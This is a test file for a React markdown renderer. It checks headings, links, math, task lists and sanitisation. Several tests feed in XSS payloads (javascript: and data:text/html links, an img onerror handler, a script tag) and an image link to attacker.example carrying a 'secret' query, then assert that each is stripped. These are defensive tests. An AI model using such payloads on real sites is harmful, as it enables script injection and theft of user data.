import React from 'react';
import {render, waitFor} from '@testing-library/react';
import {MarkdownText} from './MarkdownText';

const root = (): HTMLElement => document.querySelector('.blue-orange-markdown-text') as HTMLElement;

describe('MarkdownText', () => {

	it('renders markdown', async () => {
		render(<MarkdownText enableCodeHighlighting={false}>{'# Title\n\nSome **bold** and a [link](https://example.com).'}</MarkdownText>);
		await waitFor(() => expect(root().querySelector('h1')).not.toBeNull());
		expect(root().querySelector('strong')!.textContent).toBe('bold');
		expect(root().querySelector('a')!.getAttribute('href')).toBe('https://example.com');
	});

	it.each([
		'[click](javascript:alert(1))',
		'[click](JaVaScRiPt:alert(1))',
		'[click][ref]\n\n[ref]: javascript:alert(1)',
		'[click](data:text/html,<script>alert(1)</script>)',
	])('drops a script link: %j', async (markdown) => {
		render(<MarkdownText enableCodeHighlighting={false}>{markdown}</MarkdownText>);
		await waitFor(() => expect(root().textContent).toContain('click'));
		expect(root().innerHTML.toLowerCase()).not.toContain('javascript:');
		expect(root().innerHTML.toLowerCase()).not.toContain('data:text/html');
	});

	it('does not pass raw html through', async () => {
		render(<MarkdownText enableCodeHighlighting={false}>{'text <img src=x onerror="alert(1)"> <script>alert(1)</script>'}</MarkdownText>);
		await waitFor(() => expect(root().textContent).toContain('text'));
		expect(root().querySelector('img, script')).toBeNull();
	});

	it('keeps rendered math', async () => {
		render(<MarkdownText enableCodeHighlighting={false}>{'$x^2$'}</MarkdownText>);
		await waitFor(() => expect(root().querySelector('.katex')).not.toBeNull());
		expect(root().querySelector('.katex-html')).not.toBeNull();
	});

	it('can leave images out', async () => {
		render(<MarkdownText enableCodeHighlighting={false} allowImages={false}>{'before ![x](https://attacker.example/?q=secret) after'}</MarkdownText>);
		await waitFor(() => expect(root().textContent).toContain('after'));
		expect(root().querySelector('img')).toBeNull();
	});

	it('shows images by default', async () => {
		render(<MarkdownText enableCodeHighlighting={false}>{'![x](https://example.com/a.png)'}</MarkdownText>);
		await waitFor(() => expect(root().querySelector('img')).not.toBeNull());
	});

	it('shows task list items as checked and unchecked', async () => {
		render(<MarkdownText enableCodeHighlighting={false}>{'- [x] done\n- [ ] todo'}</MarkdownText>);
		await waitFor(() => expect(root().textContent).toContain('todo'));
		const items = Array.from(root().querySelectorAll('li')).map(item => item.textContent!.trim());
		expect(items).toEqual(['\u2611 done', '\u2610 todo']);
		expect(root().querySelector('input')).toBeNull();
	});

	it('does not leave the TeX source loose inside rendered math', async () => {
		render(<MarkdownText enableCodeHighlighting={false}>{'$$\\frac{a}{b}$$'}</MarkdownText>);
		await waitFor(() => expect(root().querySelector('math')).not.toBeNull());
		expect(root().querySelector('math')!.textContent).not.toContain('\\frac');
	});
});
